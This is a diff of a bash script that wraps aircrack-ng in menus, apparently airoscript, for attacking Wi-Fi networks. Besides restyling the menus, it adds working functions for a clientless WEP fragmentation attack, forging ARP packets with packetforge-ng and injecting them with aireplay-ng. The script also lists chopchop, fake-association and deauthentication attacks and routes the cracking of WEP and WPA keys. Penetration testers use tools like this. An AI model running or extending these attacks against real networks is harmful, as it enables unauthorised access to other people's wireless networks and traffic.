@@ -83,13 +83,14 @@ INTERFACES=`iwconfig | grep ESSID | awk '{ print $1 }'| grep -v lo | grep -v ine
 	clear
 	if [ $WIFI =  ]
 		then
-			echo "Choose wich network interface you would like to use:"
-			echo " "
-				select WIFI in $INTERFACES; do
-				break;
-			done
-		clear
-		echo "Interface to use is now set to: $WIFI"
+  echo "#######################################"
+  echo "###     Select your interface       ###"
+  echo " "
+		select WIFI in $INTERFACES; do
+		break;
+		done
+  echo "#######################################"
+  echo "### Interface to use is : $WIFI"
 	else
 		clear 
 	fi
@@ -141,8 +142,8 @@ function Parseforap {
 ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
 head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
 clear
-echo ""
-echo "    Here are the access point detected during step 1"
+echo "#######################################"
+echo "### Select Target from this list    ###"
 echo ""
 echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
 echo ""
@@ -161,8 +162,7 @@ while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV L
    fi
 done < $DUMP_PATH/dump-02.txt
 echo ""
-echo "    Please enter desired Access Point's Number"
-echo ""
+echo "###     Select target              ###"
 read choice
 idlenght=${aidlenght[$choice]}
 ssid=${assid[$choice]}
@@ -183,16 +183,17 @@ Host_SSID=${ssid:1:fin}
 function choosetype {
 while true; do
   clear
-  echo "What type off access point are you looking for?"
-  echo ""
-  echo "Select encryption type to filter"
-  echo ""
-  echo "1) No filter"
-  echo "2) OPN"
-  echo "3) WEP"
-  echo "4) WPA"
-  echo "5) WPA1"
-  echo "6) WPA2"
+  echo "#######################################"
+  echo "###     Select AP specification     ###"
+  echo "###                                 ###"
+  echo "###   1) No filter                  ###"
+  echo "###   2) OPN                        ###"
+  echo "###   3) WEP                        ###"
+  echo "###   4) WPA                        ###"
+  echo "###   5) WPA1                       ###"
+  echo "###   6) WPA2                       ###"
+  echo "###                                 ###"
+  echo "#######################################"
   read yn
   echo ""
   case $yn in
@@ -215,7 +216,7 @@ while true; do
   echo ""
   echo "1) Conservative"
   echo "2) Standard"
-  echo "3) Aggressive"
+  echo "3) Progressive"
   read yn
   echo ""
   case $yn in
@@ -230,13 +231,14 @@ done
 # This is a simple function to ask what type of scan you want to run
 function choosescan {
 while true; do
-  clear
-  echo "Airodump will now be launched, hit ctrl+c when target(s) is found"
-  echo ""
-  echo "Do you want to scan on multiple channels or on a specific channel?"
-  echo ""
-  echo "1) Channel Hopping "
-  echo "2) Specific channel(s) ex: 11 or  1,5-7,9,11-13 or 1,6,11 or 1-6 "
+
+  echo "#######################################"
+  echo "###  Select channel to use          ###"
+  echo "###                                 ###"
+  echo "###   1) Channel Hopping            ###"
+  echo "###   2) Specific channel(s)        ###"
+  echo "###                                 ###"
+  echo "#######################################"
   read yn
   echo ""
   case $yn in
@@ -312,37 +314,44 @@ done
 function attackwep {
 while true; do
   clear
-  echo "WEP ATTACK MODE"
-  echo ""
-  echo "Which attack would you like to perform?"
-  echo ""
-  echo "1) Fake association => Automatic"
-  echo "2) Fake association => Interactive"
-  echo "3) Using a client   => Automatic"
-  echo "4) Using a client   => Interactive"
-  echo "5) Fragmentation attack - Fragmentation part"
-  echo "6) Chopchop attack"
-  echo "7) Chopchop attack using a client"
-  echo "8) Solo interactive attack (attempt to jump start stalled injections)"
-  echo "9) Chopchop attack injection part of the attack"
-  echo "10) Chopchop attack using a client injection part of the attack"
-  echo "11) Fragmentation attack - Injection part"
-  echo "12) ARP packet generation and injection from a xor"
+  echo "#######################################"
+  echo "### Attacks not using a client      ###"
+  echo "1)  Fake association => Automatic   ###"
+  echo "2)  Fake association => Interactive ###"
+  echo "3)  Fragmentation attack            ###"
+  echo "4)  Chopchop attack                 ###"
+  echo "#######################################"
+  echo "### Attacks using a client          ###"
+  echo "5)  Using a client   => Automatic   ###"
+  echo "6)  Using a client   => Interactive ###"
+  echo "7)  Fragmentation attack            ###"
+  echo "8)  Chopchop attack                 ###"
+  echo "#######################################"
+  echo "### Injection if xor file generated ###" 
+  echo "9)  Chopchop injection              ###"
+  echo "10) Chopchop injection with client  ###"
+  echo "11) Fragment injection              ###"
+  echo "12) Fragment injection with client  ###"
+  echo "13) ARP gen&inject from xor (PSK)   ###"
   read yn
   echo ""
   case $yn in
     1 ) attack ; break ;;
     2 ) fakeinteractiveattack ; break ;;
-    3 ) attackclient ; break ;;
-    4 ) interactiveattack ; break ;;
-    5 ) fragmentationattack ; break ;;
-    6 ) chopchopattack ; break ;;
-    7 ) chopchopattackclient ; break ;;
-    8 ) solointeractiveattack ; break ;;
+    3 ) fragnoclient ; break ;;
+    4 ) chopchopattack ; break ;;
+
+    5 ) attackclient ; break ;;
+    6 ) interactiveattack ; break ;;
+    7 ) fragmentationattack ; break ;;
+    8 ) chopchopattackclient ; break ;;
+
+#   8 ) solointeractiveattack ; break ;;
     9 ) chopchopend ; break ;;
    10 ) chopchopclientend ; break ;;
-   11 ) fragmentationattackend ; break ;;
-   12 ) pskarp ; break ;;
+   11 ) fragnoclientend ; break ;;
+   12 ) fragmentationattackend ; break ;;
+   13 ) pskarp ; break ;;
     * ) echo "unknown response. Try again" ;;
   esac
 done 
@@ -564,14 +573,9 @@ function wpaconfigure {
 function witchcrack {
 if [ $Host_ENC = "WEP" ]
   		then
-		echo "Will launch aircrack-ng searching for WEP KEY"
 		crack
-		elif [ $Host_ENC = "WPA" ]
-		then
-		echo "Will launch aircrack-ng searching for WPA KEY"
-		wpacrack
 		else
-		echo "unknown encryption type"
+		wpacrack
 		fi			
 }
 function witchattack {
@@ -588,14 +592,9 @@ if [ $Host_ENC = "WEP" ]
 function witchconfigure {
 if [ $Host_ENC = "WEP" ]
   		then
-		echo "Will configure interface using WEP KEY"
 		configure
-		elif [ $Host_ENC = "WPA" ]
-		then
-		echo "Will configure interface using WPA KEY"
-		wpaconfigure
 		else
-		echo "unknown encryption type"
+		wpaconfigure
 		fi			
 }
 # aircrack command 
@@ -618,7 +617,13 @@ function Scan {
 }
 # This scan for targets on a specific channel
 function Scanchan {
-echo -n "On which channel would you like to scan ? ==> "
+  echo "#######################################"
+  echo "### Input channel number            ###"
+  echo "### It can be a single number  6    ###"
+  echo "### A range                   1-5   ###"
+  echo "### Multiple channels 1,1,2,5-7,11  ###"
+  echo "#######################################"
+#echo -n "On which channel would you like to scan ? ==> "
 read channel_number
 echo You typed: $channel_number
 set -- ${channel_number}
@@ -708,6 +713,18 @@ rm -rf $DUMP_PATH/chopchop_$Host_MAC*
 	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI
 }
 
+function fragnoclient {
+rm -rf fragment-*
+rm -rf $DUMP_PATH/frag_*
+rm -rf $DUMP_PATH/$Host_MAC*
+killall -9 airodump-ng aireplay-ng
+iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth &  menufonction
+}
+function fragnoclientend {
+$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
+capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
+}
 function fragmentationattack {
 rm -rf fragment-*
 rm -rf $DUMP_PATH/frag_*
@@ -773,8 +790,8 @@ select choix in $CHOICES; do
 	choosescan
 	clear
 	menu
-	echo "Airodump closed, now use option 2 to select target"
-	echo " "					
+        echo "#######################################"
+	echo "### Airodump closed, select a target###"				
 	elif [ "$choix" = "2" ]; then
 	Parseforap
 	clear
@@ -798,12 +815,10 @@ select choix in $CHOICES; do
 	echo "iwconfig $WIFI rate $Host_SPEED"M""
 	witchattack	
 	clear
-	echo "Attack starting with variables set to :"
 	target
 	sleep 2;
 	menu
 	elif [ "$choix" = "4" ]; then
-	echo "launching aircrack, if aircrack shell closes quickly, try again with more IVs"
 	witchcrack
 	menu
 	elif [ "$choix" = "5" ]; then
@@ -816,7 +831,6 @@ select choix in $CHOICES; do
 	choosedeauth
 	menu
 	elif [ "$choix" = "8" ]; then
-	echo "Will restart interface and kill all airodump-ng and aireplay-ng threads"
 	cleanup
 	menu
 	elif [ "$choix" = "9" ]; then
@@ -832,9 +846,8 @@ exit
 	else
 	clear
 	menu
-	echo " "
-	echo "You did not enter a value in the menu, please try again"
-	echo " "               
+        echo "#######################################"
+        echo "###      Wrong number entered       ###"
 	fi
 done
 #END
